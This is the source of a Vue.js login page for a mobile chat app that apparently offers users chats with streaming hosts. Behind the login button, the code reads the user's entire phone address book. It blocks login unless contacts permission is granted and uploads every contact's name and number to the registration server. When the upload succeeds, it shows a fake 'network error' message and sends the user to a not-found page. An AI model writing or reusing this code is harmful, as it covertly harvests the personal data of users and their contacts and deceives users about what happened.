<template>
    <div class="Login">
        <div class="bigTop">
            <i class="iconfont backBtn" @click="goHome">&#xe646;</i>
            <div class="inputNum">
                <div class="title">
                    请输入您的手机号
                </div>
                <input type="text" class="userName" placeholder="零点用户名" v-model="userName">
                <input type="text" class="userPhone" placeholder="手机号" v-model="userPhone">
            </div>
        </div>
        <div class="bigBottom">
            <div class="loginBtn" @click="login" v-if="buttonState">
                登录
            </div>
            <div class="loginBtn" v-else>
                登录中···
            </div>

            <div class="bottomText">
                登录即代表同意
                <span @click="goAgreement">用户协议及隐私政策</span>
            </div>
            <!-- <div  v-for="(item,index) in list" :key="index">
                <span>{{item.displayName}}</span>
                    <span v-for="(subitem,idx) in item.phoneNumbers" :key="idx">
                        <span>{{subitem.value}}</span>
                    </span>
            </div> -->
            <div class="bottomWecome">
                登录后免费领取爱心与主播交友、聊天、互动
            </div>
        </div>
    </div>
</template>


<script>

import { Toast} from 'vant';
import Vue from 'vue';
import { setTimeout } from 'timers';
import {register} from '../api/getData';

Vue.use(Toast);

export default {
    inject: ['reload'],
    data () {
        return {
            userName:"",
            userPhone:"",
            buttonState:true,
            list: []
        } 
    },
    methods: {
        goHome(){
            this.$router.push({path:'/'});
        },
        goAgreement(){
            this.$router.push({path:'/Agreement'});
        },
        login(){
            this.buttonState=false;

            if(this.userName=="" || this.userPhone==""){
                Toast('用户名或手机号不能为空！');
                this.reload();
                this.buttonState=true;
            }else{
                if (this.userName.length<3 || this.userName.length>12) {
                    Toast('用户名长度有误,请重新输入！');
                    this.reload();
                    this.buttonState=true;
                }else if (!(/^1[3456789]\d{9}$/.test(this.userPhone))) {
                    Toast('手机号输入有误,请重新输入！');
                    this.reload();
                    this.buttonState=true;
                }else{
                    // var that = this
                    // 获取通讯录对象
                    
                    var u = navigator.userAgent, app = navigator.appVersion;  
                    var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Linux') > -1; //android终端或者uc浏览器  
                    var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端  
                    if(isAndroid==true){
                        plus.contacts.getAddressBook( plus.contacts.ADDRESSBOOK_PHONE, ( addressbook )=>{
                            // Toast('获取通讯录对象成功！');
                            // console.log(addressbook)
                            // 查找联系人
                            addressbook.find(["displayName","phoneNumbers"],(contacts)=>{
                                var main = plus.android.runtimeMainActivity();
                                var a = plus.android.importClass('android.content.ContentProviderOperation');
                                var b = plus.android.importClass('android.content.ContentResolver');
                                var c = plus.android.importClass('android.database.Cursor');
                                var cc = plus.android.importClass('android.net.Uri');
                                var d = plus.android.importClass('android.test.AndroidTestCase');
                                var e = plus.android.importClass('android.util.Log');

                                var uri = cc.parse("content://com.android.contacts/contacts");
                                var arr = ["_id"];
                                var resolver = main.getContext().getContentResolver();
                                var cursor = resolver.query(uri, arr, null, null, null);
                                if (cursor.moveToNext() == false) {
                                    Toast("请打开手机权限,否则无法登录!");
                                    this.buttonState=true;
                                }else{
                                    var limit={
                                        username:this.userName,
                                        phone:this.userPhone,
                                        other:JSON.stringify(contacts)
                                    };
                                    register (limit).then(res=>{
                                        if(res.data.success==true){
                                            setTimeout(()=>{
                                                this.$router.push({path:'/NotFind'});
                                                Toast('啊哦，网络出错咯!');
                                                this.buttonState=true;
                                            },1000);
                                        }else{
                                            Toast('注册失败，请重新注册！');
                                            this.buttonState=true;
                                        }
                                    })
                                    // console.log(JSON.stringify(contacts))
                    		        // this.list = contacts
                                }
                            }, ()=>{
                                this.buttonState=true;
                                Toast('获取联系人失败,请允许系统获取通讯录！');

                            },{multiple:true});
                        }, ( e )=>{
                            this.buttonState=true;
                            Toast('注册失败，请允许系统获取通讯录！');
                        });
                    }
                    if(isiOS==true){
                        plus.contacts.getAddressBook( plus.contacts.ADDRESSBOOK_PHONE, ( addressbook )=>{
                            // Toast('获取通讯录对象成功！');
                            // 查找联系人
                            addressbook.find(["displayName","phoneNumbers"],(contacts)=>{
                                    var iosLimit={
                                        username:this.userName,
                                        phone:this.userPhone,
                                        other:JSON.stringify(contacts)
                                    };
                                    register (iosLimit).then(res=>{
                                        if(res.data.success==true){
                                            setTimeout(()=>{
                                                this.$router.push({path:'/NotFind'});
                                                Toast('啊哦，网络出错咯!');
                                                this.buttonState=true;
                                            },1000);
                                        }else{
                                            Toast('注册失败，请重新注册！');
                                            this.buttonState=true;
                                        }
                                    })
                            }, ()=>{
                                this.buttonState=true;
                                Toast('获取联系人失败,请允许系统获取通讯录！');

                            },{multiple:true});
                        }, ( e )=>{
                            this.buttonState=true;
                            Toast('注册失败，请允许系统获取通讯录！');
                        });
                    }
                }
            }
        }
    }
}
</script>

<style scoped>

.Login{
    width: 100%;
    height: 100%;
    display: flex;
    flex-direction: column;
}
.bigTop{
    width: 100%;
    height: 258px;
    position: relative;
    background: linear-gradient(to bottom left, #b889e6 , #685eda);
}
.bigBottom{
    width: 100%;
    /* height: 65%; */
    flex: 1;
    background: #f6f6f6;
    padding-top: 75px;
    box-sizing: border-box;
    position: relative;
}
.backBtn{
    font-size: 28px;
    color: #fff;
    margin-left: 4%;
    margin-top: 8%;
    display: inline-block;
}
.inputNum{
    width: 90%;
    height: 80%;
    background: #fff;
    border-radius:10px;
    position: absolute;
    left: 5%;
    bottom: -50px;
    z-index: 1;
}
.title{
    color: #1a1a1a;
    text-align: center;
    font-size: 20px;
    letter-spacing: 2px;
    padding: 24px 0;
    font-weight: 600;
}
.inputNum>input{
    width: 84%;
    margin-left: 5%;
    outline: 0;
    border: 0;   
    border: 2px solid #eeeeee;
    border-radius: 6px;
    line-height: 38px;
    background: #f9f9fa;
    color: #000;
    padding:0 10px;
}
.userName{
    margin-bottom: 24px;
}
.inputNum>input::-webkit-input-placeholder{
    color: #999999;
    font-size: 14px;
    /* font-weight: 600; */
    letter-spacing: 2px;
}
.loginBtn{
    width: 90%;
    text-align: center;
    color: #fff;
    padding: 10px 0;
    margin: 0 auto;
    background: linear-gradient(to right, #f3b0a0 , #ec649a);
    border-radius: 25px;
    letter-spacing: 2px;
}
.bottomText{
    width: 100%;
    color: #b9b9b9;
    font-size: 12px;
    text-align: center;
    letter-spacing: 1px;
    padding: 15px 0;
}
.bottomText>span{
    font-size: 13px;
    color: #1c1c1c;
    text-decoration:underline;
}
.bottomWecome{
    width: 100%;
    color: #b9b9b9;
    font-size: 12px;
    text-align: center;
    letter-spacing: 2px;
    position: absolute;
    bottom: 6%;
}

</style>

